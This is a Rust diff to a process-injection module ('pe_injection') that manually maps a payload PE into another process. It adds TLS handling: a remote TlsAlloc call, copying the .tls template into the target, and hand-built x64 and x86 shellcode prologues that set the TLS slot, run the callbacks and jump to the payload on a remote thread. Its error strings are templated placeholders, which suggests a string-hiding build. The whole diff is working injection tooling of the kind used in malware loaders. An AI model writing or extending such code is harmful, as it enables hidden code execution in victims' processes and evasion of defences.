@@ -98,6 +98,8 @@ struct Pe {
     reloc_size: u32,
     import_rva: u32,
     import_size: u32,
+    tls_rva: u32,
+    tls_size: u32,
 }
 
 /// One module in the target process, as its loader list reports it.
@@ -230,16 +232,435 @@ fn map_payload(
     //    narrowed, so no page is ever writable and executable at once.
     protect_image(process, base, pe)?;
 
-    // 7. Start the payload entry point on a thread of its own. The start
-    //    routine returns into `RtlExitUserThread`, so a payload whose entry
-    //    point returns still ends its thread cleanly.
+    // 7. Start the payload on a thread of its own. Without a TLS directory the
+    //    entry point runs directly; with one, the thread first runs a small
+    //    prologue that sets its TLS slot and runs the payload's
+    //    DLL_PROCESS_ATTACH callbacks before jumping to the entry point. The
+    //    start routine returns into `RtlExitUserThread`, so a payload whose
+    //    entry point returns still ends its thread cleanly.
     let entry = base + pe.entry_point_rva as u64;
+    let thread = match provision_tls(process, base, image, pe)? {
+        Some(provision) => start_with_tls(process, base, entry, &provision)?,
+        None => start_at_entry(process, entry)?,
+    };
+    crate::tech_dbg!("pe_injection", "payload thread started at 0x{entry:x}");
+    Ok(thread)
+}
+
+// --- Payload TLS ---
+//
+// `pe_injection` starts the payload on a fresh, loader-created thread, which has
+// no TLS slot for the manually-mapped image. Like process hollowing, this
+// reserves a real index, publishes `_tls_index` and materializes the `.tls`
+// template. The slot itself cannot be written cross-process without reading the
+// thread's TEB, so the work is handed to a tiny target-resident prologue the
+// payload thread runs before its entry point: `TlsSetValue` sets the slot, the
+// prologue then runs the payload's `DLL_PROCESS_ATTACH` callbacks (each on a
+// started thread with a real TLS array), and finally jumps to the entry point.
+
+/// `TlsAlloc`'s failure value.
+const TLS_OUT_OF_INDEXES: u32 = u32::MAX;
+/// Byte offset of the null-terminated callback array within the prologue page.
+const CALLBACKS_OFFSET: usize = 0x200;
+
+/// The payload's TLS directory, rebased onto the target's image base.
+struct TlsInfo {
+    /// Address of the DWORD the payload's CRT reads as `_tls_index`.
+    index_va: u64,
+    /// Address of the null-terminated callback array (0 = none).
+    callbacks_va: u64,
+    /// Address of the `.tls` template bytes.
+    template_va: u64,
+    /// Size of the template (`EndAddressOfRawData - StartAddressOfRawData`).
+    template_len: usize,
+    /// Zero-filled bytes that follow the template in each thread's block.
+    zero_fill: usize,
+}
+
+/// Everything the TLS-aware start needs: the reserved index, the template block
+/// and the relocated callbacks.
+struct TlsProvision {
+    index: u32,
+    block: u64,
+    callbacks: Vec<u64>,
+}
+
+/// Reads the payload's TLS directory out of the (relocated) image.
+fn parse_tls(image: &[u8], pe: &Pe) -> Result<Option<TlsInfo>, String> {
+    if pe.tls_rva == 0 || pe.tls_size == 0 {
+        return Ok(None);
+    }
+    let dir = rva_to_offset(pe, pe.tls_rva).ok_or_else(|| $MSG_TLS_DIR_UNMAPPED$)?;
+    // IMAGE_TLS_DIRECTORY: StartAddressOfRawData, EndAddressOfRawData,
+    // AddressOfIndex, AddressOfCallBacks (all pointer-sized), then SizeOfZeroFill
+    // and Characteristics (both 32-bit).
+    #[cfg(target_arch = "x86_64")]
+    let (raw_start, raw_end, index_va, callbacks_va, zero_fill) = (
+        read_u64(image, dir)?,
+        read_u64(image, dir + 8)?,
+        read_u64(image, dir + 16)?,
+        read_u64(image, dir + 24)?,
+        read_u32(image, dir + 32)? as usize,
+    );
+    #[cfg(target_arch = "x86")]
+    let (raw_start, raw_end, index_va, callbacks_va, zero_fill) = (
+        read_u32(image, dir)? as u64,
+        read_u32(image, dir + 4)? as u64,
+        read_u32(image, dir + 8)? as u64,
+        read_u32(image, dir + 12)? as u64,
+        read_u32(image, dir + 16)? as usize,
+    );
+    Ok(Some(TlsInfo {
+        index_va,
+        callbacks_va,
+        template_va: raw_start,
+        template_len: raw_end.saturating_sub(raw_start) as usize,
+        zero_fill,
+    }))
+}
+
+/// Reserves a TLS index, publishes `_tls_index`, materializes the `.tls`
+/// template and collects the payload's callbacks — the state the prologue needs.
+fn provision_tls(
+    process: HANDLE,
+    base: u64,
+    image: &[u8],
+    pe: &Pe,
+) -> Result<Option<TlsProvision>, String> {
+    let Some(info) = parse_tls(image, pe)? else {
+        return Ok(None);
+    };
+
+    // 1. Allocate a real index in the target: run `TlsAlloc` there and read its
+    //    result back from the throwaway thread's exit status.
+    let index = remote_tls_alloc(process)?;
+    if index == TLS_OUT_OF_INDEXES {
+        return Err($MSG_TLS_INDEX_FAILED$);
+    }
+
+    // 2. Publish it where the payload reads `_tls_index`.
+    if info.index_va != 0 {
+        write_remote(process, info.index_va, &index.to_le_bytes())?;
+    }
+
+    // 3. Allocate a private copy of the `.tls` template; the prologue hands it
+    //    to `TlsSetValue` as this thread's block.
+    let mut block: u64 = 0;
+    if info.template_len + info.zero_fill > 0 {
+        let mut address: *mut core::ffi::c_void = core::ptr::null_mut();
+        let mut size = info.template_len + info.zero_fill;
+        let status = crate::nt_alloc_vm(
+            process,
+            &mut address,
+            0,
+            &mut size,
+            MEM_COMMIT.0 | MEM_RESERVE.0,
+            PAGE_READWRITE.0,
+        );
+        if status < 0 || address.is_null() {
+            return Err(nt_error($MSG_TLS_BLOCK_ALLOC_FAILED$, status));
+        }
+        block = address as u64;
+        if info.template_len > 0 {
+            let rva = info.template_va.wrapping_sub(base) as u32;
+            let offset = rva_to_offset(pe, rva).ok_or_else(|| $MSG_TLS_TEMPLATE_UNMAPPED$)?;
+            let end = offset
+                .checked_add(info.template_len)
+                .ok_or_else(|| $MSG_TLS_TEMPLATE_OOB$)?;
+            if end > image.len() {
+                return Err($MSG_TLS_TEMPLATE_OOB$);
+            }
+            write_remote(process, block, &image[offset..end])?;
+        }
+    }
+
+    let callbacks = read_callback_array(image, pe, base, &info)?;
+    Ok(Some(TlsProvision {
+        index,
+        block,
+        callbacks,
+    }))
+}
+
+/// Allocates a TLS index in the target by running `TlsAlloc` on a throwaway
+/// remote thread and reading the index back from its exit status.
+fn remote_tls_alloc(process: HANDLE) -> Result<u32, String> {
+    let tls_alloc = resolve_kernel32_export($TLS_ALLOC_DEF$)?;
+    let mut thread = HANDLE::default();
+    let status = crate::nt_create_thread_ex(process, &mut thread, tls_alloc, 0, 0);
+    if status < 0 {
+        return Err(nt_error($MSG_TLSALLOC_RUN_FAILED$, status));
+    }
+    let status = crate::nt_wait_for_single_object(thread, u32::MAX);
+    if status < 0 {
+        let _ = crate::nt_close(thread);
+        return Err(nt_error($MSG_TLSALLOC_UNFINISHED$, status));
+    }
+    let info = thread_basic_information(thread)?;
+    let _ = crate::nt_close(thread);
+    if info.exit_status < 0 {
+        return Err(nt_error($MSG_TLSALLOC_FAILED$, info.exit_status));
+    }
+    Ok(info.exit_status as u32)
+}
+
+/// Resolves `TlsSetValue`'s session-wide address in the current process; the
+/// prologue calls it in the target, where kernel32 shares the same base.
+fn resolve_tls_set_value() -> Result<usize, String> {
+    let name: String = $TLS_SET_VALUE_DEF$;
+    resolve_kernel32_export(name)
+}
+
+/// Walks the payload's null-terminated TLS callback array and returns the
+/// relocated callback addresses, in order.
+fn read_callback_array(
+    image: &[u8],
+    pe: &Pe,
+    base: u64,
+    info: &TlsInfo,
+) -> Result<Vec<u64>, String> {
+    if info.callbacks_va == 0 {
+        return Ok(Vec::new());
+    }
+    let rva = info.callbacks_va.wrapping_sub(base) as u32;
+    let mut off = rva_to_offset(pe, rva).ok_or_else(|| $MSG_TLS_CALLBACKS_UNMAPPED$)?;
+    let mut callbacks = Vec::new();
+    loop {
+        #[cfg(target_arch = "x86_64")]
+        let address = {
+            let end = off
+                .checked_add(8)
+                .ok_or_else(|| $MSG_TLS_CALLBACKS_UNTERMINATED$)?;
+            if end > image.len() {
+                return Err($MSG_TLS_CALLBACKS_UNTERMINATED$);
+            }
+            read_u64(image, off)?
+        };
+        #[cfg(target_arch = "x86")]
+        let address = {
+            let end = off
+                .checked_add(4)
+                .ok_or_else(|| $MSG_TLS_CALLBACKS_UNTERMINATED$)?;
+            if end > image.len() {
+                return Err($MSG_TLS_CALLBACKS_UNTERMINATED$);
+            }
+            read_u32(image, off)? as u64
+        };
+        if address == 0 {
+            break;
+        }
+        callbacks.push(address);
+        #[cfg(target_arch = "x86_64")]
+        {
+            off += 8;
+        }
+        #[cfg(target_arch = "x86")]
+        {
+            off += 4;
+        }
+    }
+    Ok(callbacks)
+}
+
+/// Serializes the callback list as a null-terminated array of pointers.
+fn render_callback_array(callbacks: &[u64]) -> Vec<u8> {
+    #[cfg(target_arch = "x86_64")]
+    {
+        let mut bytes = Vec::with_capacity((callbacks.len() + 1) * 8);
+        for callback in callbacks {
+            bytes.extend_from_slice(&callback.to_le_bytes());
+        }
+        bytes.extend_from_slice(&0u64.to_le_bytes());
+        bytes
+    }
+    #[cfg(target_arch = "x86")]
+    {
+        let mut bytes = Vec::with_capacity((callbacks.len() + 1) * 4);
+        for callback in callbacks {
+            bytes.extend_from_slice(&(*callback as u32).to_le_bytes());
+        }
+        bytes.extend_from_slice(&0u32.to_le_bytes());
+        bytes
+    }
+}
+
+/// Builds the x64 prologue the payload thread runs before its entry point:
+/// set the TLS slot via `TlsSetValue`, run each callback with
+/// `DLL_PROCESS_ATTACH`, then jump to the entry point.
+#[cfg(target_arch = "x86_64")]
+fn build_prologue(
+    index: u32,
+    block: u64,
+    tls_set_value: u64,
+    callbacks_ptr: u64,
+    image_base: u64,
+    entry: u64,
+) -> Vec<u8> {
+    let mut code = Vec::with_capacity(83);
+    // mov ecx, index                          ; 0
+    code.extend_from_slice(&[0xB9]);
+    code.extend_from_slice(&index.to_le_bytes());
+    // mov rdx, block                          ; 5
+    code.extend_from_slice(&[0x48, 0xBA]);
+    code.extend_from_slice(&block.to_le_bytes());
+    // mov rax, tls_set_value                  ; 15
+    code.extend_from_slice(&[0x48, 0xB8]);
+    code.extend_from_slice(&tls_set_value.to_le_bytes());
+    // call rax                                ; 25
+    code.extend_from_slice(&[0xFF, 0xD0]);
+    // mov rbx, callbacks_ptr                  ; 27
+    code.extend_from_slice(&[0x48, 0xBB]);
+    code.extend_from_slice(&callbacks_ptr.to_le_bytes());
+    // loop: mov rax, [rbx]                    ; 37
+    code.extend_from_slice(&[0x48, 0x8B, 0x03]);
+    // test rax, rax                           ; 40
+    code.extend_from_slice(&[0x48, 0x85, 0xC0]);
+    // je done (+26 -> 71)                     ; 43
+    code.extend_from_slice(&[0x74, 26]);
+    // mov rcx, image_base                     ; 45
+    code.extend_from_slice(&[0x48, 0xB9]);
+    code.extend_from_slice(&image_base.to_le_bytes());
+    // mov edx, 1                              ; 55
+    code.extend_from_slice(&[0xBA, 0x01, 0x00, 0x00, 0x00]);
+    // xor r8, r8                              ; 60
+    code.extend_from_slice(&[0x4D, 0x31, 0xC0]);
+    // call rax                                ; 63
+    code.extend_from_slice(&[0xFF, 0xD0]);
+    // add rbx, 8                              ; 65
+    code.extend_from_slice(&[0x48, 0x83, 0xC3, 0x08]);
+    // jmp loop (-34 -> 37)                    ; 69
+    code.extend_from_slice(&[0xEB, 0xDE]);
+    // done: mov rax, entry                    ; 71
+    code.extend_from_slice(&[0x48, 0xB8]);
+    code.extend_from_slice(&entry.to_le_bytes());
+    // jmp rax                                 ; 81
+    code.extend_from_slice(&[0xFF, 0xE0]);
+    code
+}
+
+/// Builds the x86 prologue (stdcall): set the TLS slot, run each callback,
+/// then jump to the entry point.
+#[cfg(target_arch = "x86")]
+fn build_prologue(
+    index: u32,
+    block: u64,
+    tls_set_value: u64,
+    callbacks_ptr: u64,
+    image_base: u64,
+    entry: u64,
+) -> Vec<u8> {
+    let mut code = Vec::with_capacity(51);
+    // push block                              ; 0
+    code.extend_from_slice(&[0x68]);
+    code.extend_from_slice(&(block as u32).to_le_bytes());
+    // push index                              ; 5
+    code.extend_from_slice(&[0x68]);
+    code.extend_from_slice(&index.to_le_bytes());
+    // mov eax, tls_set_value                  ; 10
+    code.extend_from_slice(&[0xB8]);
+    code.extend_from_slice(&(tls_set_value as u32).to_le_bytes());
+    // call eax                                ; 15
+    code.extend_from_slice(&[0xFF, 0xD0]);
+    // mov ebx, callbacks_ptr                  ; 17
+    code.extend_from_slice(&[0xBB]);
+    code.extend_from_slice(&(callbacks_ptr as u32).to_le_bytes());
+    // loop: mov eax, [ebx]                    ; 22
+    code.extend_from_slice(&[0x8B, 0x03]);
+    // test eax, eax                           ; 24
+    code.extend_from_slice(&[0x85, 0xC0]);
+    // je done (+16 -> 44)                     ; 26
+    code.extend_from_slice(&[0x74, 16]);
+    // push 0 (reserved)                       ; 28
+    code.extend_from_slice(&[0x6A, 0x00]);
+    // push 1 (reason)                         ; 30
+    code.extend_from_slice(&[0x6A, 0x01]);
+    // push image_base                         ; 32
+    code.extend_from_slice(&[0x68]);
+    code.extend_from_slice(&(image_base as u32).to_le_bytes());
+    // call eax                                ; 37
+    code.extend_from_slice(&[0xFF, 0xD0]);
+    // add ebx, 4                              ; 39
+    code.extend_from_slice(&[0x83, 0xC3, 0x04]);
+    // jmp loop (-22 -> 22)                    ; 42
+    code.extend_from_slice(&[0xEB, 0xEA]);
+    // done: mov eax, entry                    ; 44
+    code.extend_from_slice(&[0xB8]);
+    code.extend_from_slice(&(entry as u32).to_le_bytes());
+    // jmp eax                                 ; 49
+    code.extend_from_slice(&[0xFF, 0xE0]);
+    code
+}
+
+/// Writes the TLS prologue and its callback array into the target and starts
+/// the payload thread on the prologue.
+fn start_with_tls(
+    process: HANDLE,
+    base: u64,
+    entry: u64,
+    provision: &TlsProvision,
+) -> Result<HANDLE, String> {
+    let tls_set_value = resolve_tls_set_value()? as u64;
+    let callback_bytes = render_callback_array(&provision.callbacks);
+
+    // One executable page holds the prologue and the null-terminated callback
+    // array; the array sits at a fixed offset so the prologue's immediate is
+    // known before any byte is written.
+    let mut region: *mut core::ffi::c_void = core::ptr::null_mut();
+    let mut region_size = 0x1000usize;
+    let status = crate::nt_alloc_vm(
+        process,
+        &mut region,
+        0,
+        &mut region_size,
+        MEM_COMMIT.0 | MEM_RESERVE.0,
+        PAGE_READWRITE.0,
+    );
+    if status < 0 || region.is_null() {
+        return Err(nt_error($MSG_TLS_PROLOGUE_ALLOC_FAILED$, status));
+    }
+    let region = region as u64;
+    let callbacks_ptr = region + CALLBACKS_OFFSET as u64;
+
+    let prologue = build_prologue(
+        provision.index,
+        provision.block,
+        tls_set_value,
+        callbacks_ptr,
+        base,
+        entry,
+    );
+    write_remote(process, region, &prologue)?;
+    write_remote(process, callbacks_ptr, &callback_bytes)?;
+
+    // Narrow the page to execute-read: the prologue runs, and both it and the
+    // callback array are read; nothing here needs to be writable again.
+    let mut previous = 0u32;
+    let status = crate::nt_protect_vm(
+        process,
+        region as *mut core::ffi::c_void,
+        region_size,
+        PAGE_EXECUTE_READ.0,
+        &mut previous,
+    );
+    if status < 0 {
+        return Err(nt_error($MSG_TLS_PROLOGUE_PROTECT_FAILED$, status));
+    }
+
+    let mut thread = HANDLE::default();
+    let status = crate::nt_create_thread_ex(process, &mut thread, region as usize, 0, 0);
+    if status < 0 {
+        return Err(nt_error($MSG_THREAD_FAILED$, status));
+    }
+    Ok(thread)
+}
+
+/// Starts the payload's entry point on a fresh thread (the no-TLS path).
+fn start_at_entry(process: HANDLE, entry: u64) -> Result<HANDLE, String> {
     let mut thread = HANDLE::default();
     let status = crate::nt_create_thread_ex(process, &mut thread, entry as usize, 0, 0);
     if status < 0 {
         return Err(nt_error($MSG_THREAD_FAILED$, status));
     }
-    crate::tech_dbg!("pe_injection", "payload thread started at 0x{entry:x}");
     Ok(thread)
 }
 
@@ -317,6 +738,15 @@ fn parse_pe(image: &[u8]) -> Result<Pe, String> {
     } else {
         (0, 0)
     };
+    // TLS directory (data directory index 9).
+    let (tls_rva, tls_size) = if num_dirs > 9 {
+        (
+            read_u32(image, dir_base + 72)?,
+            read_u32(image, dir_base + 76)?,
+        )
+    } else {
+        (0, 0)
+    };
 
     let section_table = opt + size_of_optional_header;
     let mut sections = Vec::with_capacity(num_sections);
@@ -345,6 +775,8 @@ fn parse_pe(image: &[u8]) -> Result<Pe, String> {
         reloc_size,
         import_rva,
         import_size,
+        tls_rva,
+        tls_size,
     })
 }
 
